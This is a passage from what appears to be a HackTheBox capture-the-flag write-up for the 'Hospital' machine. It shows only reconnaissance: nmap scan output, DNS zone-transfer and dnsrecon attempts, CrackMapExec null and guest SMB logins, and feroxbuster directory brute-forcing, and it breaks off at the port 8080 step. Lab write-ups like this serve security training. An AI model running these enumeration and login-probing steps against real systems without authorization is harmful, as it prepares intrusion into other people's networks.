---
render_with_liquid: false
title: HackTheBox Writeup  Hospital
date: 2023-11-20 02:38:58 +1400
tags: [hackthebox, nmap, windows, linux, hyper-v, crackmapexec, kerbrute, php, burpsuite, file-upload, file-upload-bypass, ffuf, php-disable-functions-bypass, phpsploit, webshell, kernel-exploit, cve-2023-2640, cve-2023-32629, hashcat, password-reuse, roundcube-webmail, ghostscript, cve-2023-36664, reverse-ssh, discover-secrets, clear-text-credentials, cve-2023-35001, smartbrute, evil-winrm]
---



# Recon
---
```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ pt init '10.129.40.48 hospital.htb DC.hospital.htb'
+----------+--------+--------------+-----------------+
| PROFILE  | STATUS |      IP      |     DOMAIN      |
+----------+--------+--------------+-----------------+
| hospital | on     | 10.129.40.48 | DC.hospital.htb |
| hospital | on     | 10.129.40.48 | hospital.htb    |
+----------+--------+--------------+-----------------+
```

## Autorecon

```bash
sudo $(which autorecon) -vv hospital.htb --global.domain hospital.htb
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Mon Nov 20 02:38:58 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6613,6619,6639,8080,9389 hospital.htb
Nmap scan report for hospital.htb (10.129.40.48)
Host is up, received user-set (0.27s latency).
Scanned at 2023-11-20 02:38:58 CST for 114s

PORT     STATE SERVICE           REASON          VERSION
53/tcp   open  domain            syn-ack ttl 127 Simple DNS Plus
135/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
| SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
| -----BEGIN CERTIFICATE-----
| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
| MQswCQYDVQQDEwJEQzAeFw0yMzA5MDYxMDQ5MDNaFw0yODA5MDYxMDQ5MDNaMA0x
| CzAJBgNVBAMTAkRDMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7obA
| P53k1qyTGrYu36d3MfqWRf+nPEFi6i+GK7/8cOoQfQPjPNMMHcmzHaFgkOdAcv12
| jctNzQYh6xUQY5R3zqjXlJyRorftvBlKDU02S4EOKsdytnziHbHG5ZEvRDoCgVH3
| uvt4U7cqwk1uE0r6iWwegK/xxtTVBPkObmepjTO1DEMyj8j6UU9jwyCH8jE5VTCC
| UiWJI/q+B/tcJcINfFerv4oDagptKrMAIfsX+ReqbZojCD5EREjMUyn+AigZTeyS
| ksesM2Cy6fkVkypComklqJw2YIIlDnPxdh3pAwjyUlbcb6WwE5aEKwuEgyRyXHET
| EKwcUBIa7y3iRSVCpQIDAQABo1UwUzAOBgNVHQ8BAf8EBAMCBaAwHgYDVR0RBBcw
| FYICREOCD0RDLmhvc3BpdGFsLmh0YjATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNV
| HRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQBjA0NUb25R42VBXvb328jEcMam
| 19VS+MPZijp14phJ0Q/YuxlztTGnSlIFrUPWtJWvx8PLtdCnE1MOmFmcS2TNISg9
| Vt1sE4RF5N9s9TeFqCE80wH+qzZMCaBTlQxrzftkTfN67+SxoEGd6aywXEmzG5tw
| wbEe/dMglJVZ0Uk2DUXjpdXIDQlFIg+Yn0CqWjUvppLUyinxpmVqoC5dY8ijuuem
| 3JjZd5mDoYg1XIP3gfAAutdsce5Safoq7oqh0OYb4sQMu0y9YcRL0JsP3cwB4FnW
| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
|_-----END CERTIFICATE-----
443/tcp  open  ssl/http          syn-ack ttl 127 Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| tls-alpn:
|_  http/1.1
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_ssl-date: TLS randomness does not represent time
|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
445/tcp  open  microsoft-ds?     syn-ack ttl 127
464/tcp  open  kpasswd5?         syn-ack ttl 127
593/tcp  open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?          syn-ack ttl 127
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
| SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
| -----BEGIN CERTIFICATE-----
| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
| MQswCQYDVQQDEwJEQzAeFw0yMzA5MDYxMDQ5MDNaFw0yODA5MDYxMDQ5MDNaMA0x
| CzAJBgNVBAMTAkRDMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7obA
| P53k1qyTGrYu36d3MfqWRf+nPEFi6i+GK7/8cOoQfQPjPNMMHcmzHaFgkOdAcv12
| jctNzQYh6xUQY5R3zqjXlJyRorftvBlKDU02S4EOKsdytnziHbHG5ZEvRDoCgVH3
| uvt4U7cqwk1uE0r6iWwegK/xxtTVBPkObmepjTO1DEMyj8j6UU9jwyCH8jE5VTCC
| UiWJI/q+B/tcJcINfFerv4oDagptKrMAIfsX+ReqbZojCD5EREjMUyn+AigZTeyS
| ksesM2Cy6fkVkypComklqJw2YIIlDnPxdh3pAwjyUlbcb6WwE5aEKwuEgyRyXHET
| EKwcUBIa7y3iRSVCpQIDAQABo1UwUzAOBgNVHQ8BAf8EBAMCBaAwHgYDVR0RBBcw
| FYICREOCD0RDLmhvc3BpdGFsLmh0YjATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNV
| HRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQBjA0NUb25R42VBXvb328jEcMam
| 19VS+MPZijp14phJ0Q/YuxlztTGnSlIFrUPWtJWvx8PLtdCnE1MOmFmcS2TNISg9
| Vt1sE4RF5N9s9TeFqCE80wH+qzZMCaBTlQxrzftkTfN67+SxoEGd6aywXEmzG5tw
| wbEe/dMglJVZ0Uk2DUXjpdXIDQlFIg+Yn0CqWjUvppLUyinxpmVqoC5dY8ijuuem
| 3JjZd5mDoYg1XIP3gfAAutdsce5Safoq7oqh0OYb4sQMu0y9YcRL0JsP3cwB4FnW
| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
|_-----END CERTIFICATE-----
1801/tcp open  msmq?             syn-ack ttl 127
2103/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
2105/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
2107/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
2179/tcp open  vmrdp?            syn-ack ttl 127
3268/tcp open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
| SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
| -----BEGIN CERTIFICATE-----
| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
| MQswCQYDVQQDEwJEQzAeFw0yMzA5MDYxMDQ5MDNaFw0yODA5MDYxMDQ5MDNaMA0x
| CzAJBgNVBAMTAkRDMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7obA
| P53k1qyTGrYu36d3MfqWRf+nPEFi6i+GK7/8cOoQfQPjPNMMHcmzHaFgkOdAcv12
| jctNzQYh6xUQY5R3zqjXlJyRorftvBlKDU02S4EOKsdytnziHbHG5ZEvRDoCgVH3
| uvt4U7cqwk1uE0r6iWwegK/xxtTVBPkObmepjTO1DEMyj8j6UU9jwyCH8jE5VTCC
| UiWJI/q+B/tcJcINfFerv4oDagptKrMAIfsX+ReqbZojCD5EREjMUyn+AigZTeyS
| ksesM2Cy6fkVkypComklqJw2YIIlDnPxdh3pAwjyUlbcb6WwE5aEKwuEgyRyXHET
| EKwcUBIa7y3iRSVCpQIDAQABo1UwUzAOBgNVHQ8BAf8EBAMCBaAwHgYDVR0RBBcw
| FYICREOCD0RDLmhvc3BpdGFsLmh0YjATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNV
| HRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQBjA0NUb25R42VBXvb328jEcMam
| 19VS+MPZijp14phJ0Q/YuxlztTGnSlIFrUPWtJWvx8PLtdCnE1MOmFmcS2TNISg9
| Vt1sE4RF5N9s9TeFqCE80wH+qzZMCaBTlQxrzftkTfN67+SxoEGd6aywXEmzG5tw
| wbEe/dMglJVZ0Uk2DUXjpdXIDQlFIg+Yn0CqWjUvppLUyinxpmVqoC5dY8ijuuem
| 3JjZd5mDoYg1XIP3gfAAutdsce5Safoq7oqh0OYb4sQMu0y9YcRL0JsP3cwB4FnW
| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
|_-----END CERTIFICATE-----
3269/tcp open  globalcatLDAPssl? syn-ack ttl 127
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
| SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
| -----BEGIN CERTIFICATE-----
| MIIC+TCCAeGgAwIBAgIQdNv8q6fykq5PQSM0k1YFAjANBgkqhkiG9w0BAQsFADAN
| MQswCQYDVQQDEwJEQzAeFw0yMzA5MDYxMDQ5MDNaFw0yODA5MDYxMDQ5MDNaMA0x
| CzAJBgNVBAMTAkRDMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7obA
| P53k1qyTGrYu36d3MfqWRf+nPEFi6i+GK7/8cOoQfQPjPNMMHcmzHaFgkOdAcv12
| jctNzQYh6xUQY5R3zqjXlJyRorftvBlKDU02S4EOKsdytnziHbHG5ZEvRDoCgVH3
| uvt4U7cqwk1uE0r6iWwegK/xxtTVBPkObmepjTO1DEMyj8j6UU9jwyCH8jE5VTCC
| UiWJI/q+B/tcJcINfFerv4oDagptKrMAIfsX+ReqbZojCD5EREjMUyn+AigZTeyS
| ksesM2Cy6fkVkypComklqJw2YIIlDnPxdh3pAwjyUlbcb6WwE5aEKwuEgyRyXHET
| EKwcUBIa7y3iRSVCpQIDAQABo1UwUzAOBgNVHQ8BAf8EBAMCBaAwHgYDVR0RBBcw
| FYICREOCD0RDLmhvc3BpdGFsLmh0YjATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNV
| HRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQBjA0NUb25R42VBXvb328jEcMam
| 19VS+MPZijp14phJ0Q/YuxlztTGnSlIFrUPWtJWvx8PLtdCnE1MOmFmcS2TNISg9
| Vt1sE4RF5N9s9TeFqCE80wH+qzZMCaBTlQxrzftkTfN67+SxoEGd6aywXEmzG5tw
| wbEe/dMglJVZ0Uk2DUXjpdXIDQlFIg+Yn0CqWjUvppLUyinxpmVqoC5dY8ijuuem
| 3JjZd5mDoYg1XIP3gfAAutdsce5Safoq7oqh0OYb4sQMu0y9YcRL0JsP3cwB4FnW
| eh2XVUa9NjHJi5hvdH3wy6/jU4UwPED41iuM6Y1rwF/l4J0LmELsmmYZEaWm
|_-----END CERTIFICATE-----
3389/tcp open  ms-wbt-server     syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2023-11-20T01:39:55+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Issuer: commonName=DC.hospital.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-05T18:39:34
| Not valid after:  2024-03-06T18:39:34
| MD5:   0c8a:ebc2:3231:590c:2351:ebbf:4e1d:1dbc
| SHA-1: af10:4fad:1b02:073a:e026:eef4:8917:734b:f8e3:86a7
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQJ8MSkg5FM7tDDww5/eWcbjANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9EQy5ob3NwaXRhbC5odGIwHhcNMjMwOTA1MTgzOTM0WhcNMjQw
| MzA2MTgzOTM0WjAaMRgwFgYDVQQDEw9EQy5ob3NwaXRhbC5odGIwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCsE7CcyqvqUyXdwU9hCSyg21qHJ3DGvSiq
| y9+Afp91IKJd35zkbYgFubrF5F4FLUzcHfcrNdBTw6oFMdNZS5txnjVIQfxoCk1f
| EUnONlIEdi9cattgsEzsNRRG9KJoLrNBIVyYAluMzSoaFF5I0lhSWTlv0ANsdTHz
| rzsc8Avs6BkKLsc03CKo4y3h+dzjWNOnwD1slvoA/IgoiJNPSlrHD01NPuD2Q93q
| 5Yr1mlbx9aew2M4gsEH1YO8k6JfTmVQNLApOVlhlRP/Ak2ZBCJz74UWagufguTSG
| dC/ucQHwe3K7qMD+DpxhMm5XaupkQFvxZdb6fQ8f8wgS6RhM/Ph9AgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAXe9RRGaMAiYnxmhDqbb3nfY9wHPmO3P8CUgzWvA0cTKSbYEb5LCA0IBK
| 7v8svFcAQM94zOWisTu54xtuSiS6PcHfxYe0SJwl/VsZm52qt+vO45Zao1ynJdw/
| SnIeAIKktpq8rZZumYwy1Am65sIRZgw2ExFNfoAIG0wJqBDmsj8qcGITXoPUkAZ4
| gYyzUSt9vwoJpTdLQSsOiLOBWM+uQYnDaPDWxGWE38Dv27uW/KO7et97v+zdC+5r
| Dg8LvFWI0XDP1S7pEfIquP9BmnICI0S6s3kj6Ad/MwEuGnB9uRSokdttIDpvU4LX
| zXOe5MnTuI+omoq6zEeUs5It4jL1Yg==
|_-----END CERTIFICATE-----
5985/tcp open  http              syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6404/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
6406/tcp open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
6409/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
6613/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
6619/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
6639/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
8080/tcp open  http              syn-ack ttl 62  Apache httpd 2.4.55 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Login
|_Requested resource was login.php
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.55 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
9389/tcp open  mc-nmf            syn-ack ttl 127 .NET Message Framing
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 45736/tcp): CLEAN (Timeout)
|   Check 2 (port 4431/tcp): CLEAN (Timeout)
|   Check 3 (port 13491/udp): CLEAN (Timeout)
|   Check 4 (port 34189/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2023-11-20T01:39:56
|_  start_date: N/A
|_clock-skew: mean: 6h59m46s, deviation: 0s, median: 6h59m46s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Mon Nov 20 02:40:52 2023 -- 1 IP address (1 host up) scanned in 113.61 seconds
```

## 53 - DNS


### Reverse lookup

```bash
dig -p 53 -x hospital.htb @hospital.htb
```

```bash
;; communications error to 10.129.40.48#53: timed out
;; communications error to 10.129.40.48#53: timed out
;; communications error to 10.129.40.48#53: timed out

; <<>> DiG 9.19.17-1-Debian <<>> -p 53 -x hospital.htb @hospital.htb
;; global options: +cmd
;; no servers could be reached
```


### Zone transfer

```bash
dig AXFR @hospital.htb
```

```bash
;; communications error to 10.129.40.48#53: timed out
;; communications error to 10.129.40.48#53: timed out
;; communications error to 10.129.40.48#53: timed out

; <<>> DiG 9.19.17-1-Debian <<>> AXFR -p 53 @hospital.htb
; (1 server found)
;; global options: +cmd
;; no servers could be reached
```


### Dnsrecon

```bash
dnsrecon -n hospital.htb -d hospital.htb
```

```bash
[*] std: Performing General Enumeration against: hospital.htb...
[-] DNSSEC is not configured for hospital.htb
[*] 	 SOA dc.hospital.htb 192.168.5.1
[*] 	 SOA dc.hospital.htb 10.129.40.48
[*] 	 SOA dc.hospital.htb dead:beef::1fa
[*] 	 SOA dc.hospital.htb dead:beef::12b4:d878:eac0:f83e
[*] 	 NS dc.hospital.htb 192.168.5.1
[*] 	 NS dc.hospital.htb 10.129.40.48
[*] 	 NS dc.hospital.htb dead:beef::1fa
[*] 	 NS dc.hospital.htb dead:beef::12b4:d878:eac0:f83e
[*] 	 A hospital.htb 192.168.5.1
[*] 	 A hospital.htb 10.129.40.48
[*] 	 AAAA hospital.htb dead:beef::1fa
[*] 	 AAAA hospital.htb dead:beef::12b4:d878:eac0:f83e
[*] Enumerating SRV Records
[+] 	 SRV _kerberos._tcp.hospital.htb dc.hospital.htb 10.129.40.48 88
[+] 	 SRV _kerberos._tcp.hospital.htb dc.hospital.htb 192.168.5.1 88
[+] 	 SRV _kerberos._tcp.hospital.htb dc.hospital.htb dead:beef::12b4:d878:eac0:f83e 88
[+] 	 SRV _kerberos._tcp.hospital.htb dc.hospital.htb dead:beef::1fa 88
[+] 	 SRV _gc._tcp.hospital.htb dc.hospital.htb 10.129.40.48 3268
[+] 	 SRV _gc._tcp.hospital.htb dc.hospital.htb 192.168.5.1 3268
[+] 	 SRV _gc._tcp.hospital.htb dc.hospital.htb dead:beef::1fa 3268
[+] 	 SRV _gc._tcp.hospital.htb dc.hospital.htb dead:beef::12b4:d878:eac0:f83e 3268
[+] 	 SRV _kerberos._udp.hospital.htb dc.hospital.htb 192.168.5.1 88
[+] 	 SRV _kerberos._udp.hospital.htb dc.hospital.htb 10.129.40.48 88
[+] 	 SRV _kerberos._udp.hospital.htb dc.hospital.htb dead:beef::1fa 88
[+] 	 SRV _kerberos._udp.hospital.htb dc.hospital.htb dead:beef::12b4:d878:eac0:f83e 88
[+] 	 SRV _ldap._tcp.hospital.htb dc.hospital.htb 192.168.5.1 389
[+] 	 SRV _ldap._tcp.hospital.htb dc.hospital.htb 10.129.40.48 389
[+] 	 SRV _ldap._tcp.hospital.htb dc.hospital.htb dead:beef::12b4:d878:eac0:f83e 389
[+] 	 SRV _ldap._tcp.hospital.htb dc.hospital.htb dead:beef::1fa 389
[+] 	 SRV _ldap._tcp.ForestDNSZones.hospital.htb dc.hospital.htb 192.168.5.1 389
[+] 	 SRV _ldap._tcp.ForestDNSZones.hospital.htb dc.hospital.htb 10.129.40.48 389
[+] 	 SRV _ldap._tcp.ForestDNSZones.hospital.htb dc.hospital.htb dead:beef::1fa 389
[+] 	 SRV _ldap._tcp.ForestDNSZones.hospital.htb dc.hospital.htb dead:beef::12b4:d878:eac0:f83e 389
[+] 	 SRV _kerberos._tcp.dc._msdcs.hospital.htb dc.hospital.htb 10.129.40.48 88
[+] 	 SRV _kerberos._tcp.dc._msdcs.hospital.htb dc.hospital.htb 192.168.5.1 88
[+] 	 SRV _kerberos._tcp.dc._msdcs.hospital.htb dc.hospital.htb dead:beef::1fa 88
[+] 	 SRV _kerberos._tcp.dc._msdcs.hospital.htb dc.hospital.htb dead:beef::12b4:d878:eac0:f83e 88
[+] 	 SRV _ldap._tcp.gc._msdcs.hospital.htb dc.hospital.htb 10.129.40.48 3268
[+] 	 SRV _ldap._tcp.gc._msdcs.hospital.htb dc.hospital.htb 192.168.5.1 3268
[+] 	 SRV _ldap._tcp.gc._msdcs.hospital.htb dc.hospital.htb dead:beef::12b4:d878:eac0:f83e 3268
[+] 	 SRV _ldap._tcp.gc._msdcs.hospital.htb dc.hospital.htb dead:beef::1fa 3268
[+] 	 SRV _kpasswd._udp.hospital.htb dc.hospital.htb 192.168.5.1 464
[+] 	 SRV _kpasswd._udp.hospital.htb dc.hospital.htb 10.129.40.48 464
[+] 	 SRV _kpasswd._udp.hospital.htb dc.hospital.htb dead:beef::1fa 464
[+] 	 SRV _kpasswd._udp.hospital.htb dc.hospital.htb dead:beef::12b4:d878:eac0:f83e 464
[+] 	 SRV _ldap._tcp.pdc._msdcs.hospital.htb dc.hospital.htb 192.168.5.1 389
[+] 	 SRV _ldap._tcp.pdc._msdcs.hospital.htb dc.hospital.htb 10.129.40.48 389
[+] 	 SRV _ldap._tcp.pdc._msdcs.hospital.htb dc.hospital.htb dead:beef::12b4:d878:eac0:f83e 389
[+] 	 SRV _ldap._tcp.pdc._msdcs.hospital.htb dc.hospital.htb dead:beef::1fa 389
[+] 	 SRV _ldap._tcp.dc._msdcs.hospital.htb dc.hospital.htb 10.129.40.48 389
[+] 	 SRV _ldap._tcp.dc._msdcs.hospital.htb dc.hospital.htb 192.168.5.1 389
[+] 	 SRV _ldap._tcp.dc._msdcs.hospital.htb dc.hospital.htb dead:beef::1fa 389
[+] 	 SRV _ldap._tcp.dc._msdcs.hospital.htb dc.hospital.htb dead:beef::12b4:d878:eac0:f83e 389
[+] 	 SRV _kpasswd._tcp.hospital.htb dc.hospital.htb 192.168.5.1 464
[+] 	 SRV _kpasswd._tcp.hospital.htb dc.hospital.htb 10.129.40.48 464
[+] 	 SRV _kpasswd._tcp.hospital.htb dc.hospital.htb dead:beef::12b4:d878:eac0:f83e 464
[+] 	 SRV _kpasswd._tcp.hospital.htb dc.hospital.htb dead:beef::1fa 464
[+] 44 Records Found
```

## 445 - SMB


### Auth

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ cme smb 10.129.40.48 -u '' -p ''
SMB         10.129.40.48    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.129.40.48    445    DC               [-] hospital.htb\: STATUS_ACCESS_DENIED
SMB         10.129.40.48    445    DC               [-] Error getting user: list index out of range
SMB         10.129.40.48    445    DC               [-] Error enumerating shares: Error occurs while reading from remote(104)

┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ cme smb 10.129.40.48 -u 'a' -p ''
SMB         10.129.40.48    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.129.40.48    445    DC               [-] hospital.htb\a: STATUS_LOGON_FAILURE
```

## 443 - HTTP : Hospital Webmail


### Info

![](/assets/obsidian/83b52bfc64e945d355d2231604f2365d.png)

### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ feroxbuster -t 150 -o ferox_443.txt -k -u 'https://hospital.htb'

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://hospital.htb
 🚀  Threads               │ 150
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_443.txt
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       33w      300c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       30w      303c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       28l      317w    12793c https://hospital.htb/program/js/common.min.js
200      GET       38l       90w      853c https://hospital.htb/skins/elastic/watermark.html
200      GET       11l       67w      888c https://hospital.htb/skins/elastic/images/logo.svg
200      GET       36l      319w    13835c https://hospital.htb/program/js/jstz.min.js
200      GET        6l     1029w    84104c https://hospital.htb/skins/elastic/deps/bootstrap.bundle.min.js
200      GET        2l       11w    34732c https://hospital.htb/skins/elastic/images/favicon.ico
200      GET        6l      472w    29309c https://hospital.htb/plugins/jqueryui/themes/elastic/jquery-ui.min.css
403      GET       11l       47w      422c https://hospital.htb/phpmyadmin
200      GET       13l      678w    61332c https://hospital.htb/skins/elastic/ui.min.js
200      GET       36l     1539w    90926c https://hospital.htb/program/js/jquery.min.js
200      GET       35l     1190w   171722c https://hospital.htb/program/js/app.min.js
200      GET        1l     3198w   120302c https://hospital.htb/skins/elastic/styles/styles.min.css
200      GET        6l     2100w   160347c https://hospital.htb/skins/elastic/deps/bootstrap.min.css
200      GET      243l     2447w   262502c https://hospital.htb/plugins/jqueryui/js/jquery-ui.min.js
200      GET       97l      333w     5322c https://hospital.htb/
301      GET        9l       30w      343c https://hospital.htb/installer => https://hospital.htb/installer/
503      GET       11l       44w      403c https://hospital.htb/examples
301      GET        9l       30w      350c https://hospital.htb/installer/images => https://hospital.htb/installer/images/
301      GET        9l       30w      350c https://hospital.htb/installer/Images => https://hospital.htb/installer/Images/
301      GET        9l       30w      350c https://hospital.htb/installer/IMAGES => https://hospital.htb/installer/IMAGES/
```


## 8080 - HTTP : Hospital medical record upload


### Info

![](/assets/obsidian/e604a11f01c16383978631abb3549d07.png)

### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
